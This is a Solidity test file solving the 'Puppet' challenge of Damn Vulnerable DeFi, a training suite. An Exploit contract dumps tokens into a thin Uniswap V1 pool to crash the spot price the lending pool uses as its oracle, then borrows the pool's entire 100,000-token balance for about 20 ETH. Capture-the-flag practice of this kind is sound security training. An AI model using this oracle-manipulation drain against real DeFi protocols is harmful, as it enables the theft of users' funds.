// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    // Uniswap V1 pool starts with equal ETH/token reserves (1:1 ratio)
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    // Player has 1000 tokens — 100x the Uniswap reserve — enough to crash the price
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;

    // The lending pool holds 100,000 tokens — our target
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the Uniswap V1 exchange template (implementation contract)
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy the Uniswap V1 factory and point it to the exchange template
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        token = new DamnValuableToken();

        // Create a dedicated Uniswap exchange for this token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the vulnerable lending pool, which uses Uniswap as its price oracle
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Seed Uniswap with 10 ETH + 10 tokens → initial price = 1 ETH per token
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0,                  // min_liquidity: accept any LP tokens
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        // Fund the player and stock the lending pool
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        // At the initial 1:1 price, borrowing requires 2x ETH collateral per token
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * CODE YOUR SOLUTION HERE
     *
     * ATTACK SUMMARY:
     * The PuppetPool uses the Uniswap V1 spot price as its collateral oracle.
     * By dumping all 1000 tokens into Uniswap, we flood the token reserve and
     * drain ETH out, crashing the token price dramatically. The lending pool then
     * thinks tokens are nearly worthless, so it only requires a tiny ETH deposit
     * to borrow the entire 100,000-token pool — well within our 25 ETH balance.
     */
    function test_puppet() public checkSolvedByPlayer {
        // Deploy exploit contract, forwarding all player ETH so it can pay collateral later
        Exploit exploit = new Exploit{value: PLAYER_INITIAL_ETH_BALANCE}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery
        );

        // Send all player tokens to the exploit contract for the price-manipulation dump
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);

        // Execute the two-step attack: crash price, then borrow cheaply
        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * Mirrors Uniswap V1's constant-product formula with the 0.3% fee (997/1000).
     * Used to verify the exchange's reported price matches expected math.
     */
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        // output = (amountIn * 997 * reserveOut) / (reserveIn * 1000 + amountIn * 997)
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Constraint: the entire attack must fit in a single player transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All 100,000 pool tokens must have been drained to the recovery address
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

/**
 * @title Exploit
 * @notice Performs a two-step oracle manipulation attack against PuppetPool:
 *
 *  Step 1 — Price Crash (tokenToEthTransferInput)
 *    Dump 1,000 tokens into the Uniswap pool whose reserve was only 10 tokens.
 *    The constant-product AMM (x * y = k) responds by draining most of the ETH
 *    reserve. New reserves are roughly: tokens ≈ 1010, ETH ≈ 0.1.
 *    The spot price (ETH per token) collapses by ~100x.
 *
 *  Step 2 — Cheap Borrow (lendingPool.borrow)
 *    PuppetPool calculates required collateral as:
 *        deposit = borrowAmount * uniswapPrice * 2
 *    With the manipulated price, borrowing 100,000 tokens now costs only ~20 ETH,
 *    which we have. Tokens go straight to the recovery address.
 */
contract Exploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;

    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }

    function attack(uint exploitAmount) public {
        uint tokenBalance = token.balanceOf(address(this)); // 1,000 tokens

        // Approve Uniswap to pull all our tokens for the dump
        token.approve(address(uniswapV1Exchange), tokenBalance);

        // Log collateral required BEFORE the price manipulation
        // Expected: ~200,000 ETH (2x the 100,000-token pool at 1 ETH/token)
        console.log("before calculateDepositRequired(amount)", lendingPool.calculateDepositRequired(exploitAmount));

        // ── STEP 1: Oracle Manipulation ──────────────────────────────────────
        // Sell all 1,000 tokens for ETH. ETH is sent here (tokenToEthTransferInput).
        // This floods the token reserve and drains ETH, collapsing the spot price.
        uniswapV1Exchange.tokenToEthTransferInput(
            tokenBalance,       // exact tokens to sell
            1,                  // minimum ETH to receive (accept any amount)
            block.timestamp,    // deadline: current block is fine in a test
            address(this)       // ETH recipient
        );

        // Sanity check: Uniswap token reserve is now ~1010 tokens (10 + 1000)
        console.log(token.balanceOf(address(uniswapV1Exchange)));

        // Log collateral required AFTER the price manipulation
        // Expected: ~20 ETH (price has dropped ~100x, so 2x collateral is tiny)
        console.log("after calculateDepositRequired(amount)", lendingPool.calculateDepositRequired(exploitAmount));

        // ── STEP 2: Drain the Lending Pool ───────────────────────────────────
        // Borrow all 100,000 pool tokens by posting only ~20 ETH collateral.
        // Tokens are sent directly to the recovery address.
        lendingPool.borrow{value: 20e18}(
            exploitAmount,  // borrow the entire pool balance
            recovery        // send borrowed tokens here
        );
    }

    // Required to receive ETH from the Uniswap token→ETH swap
    receive() external payable {}
}
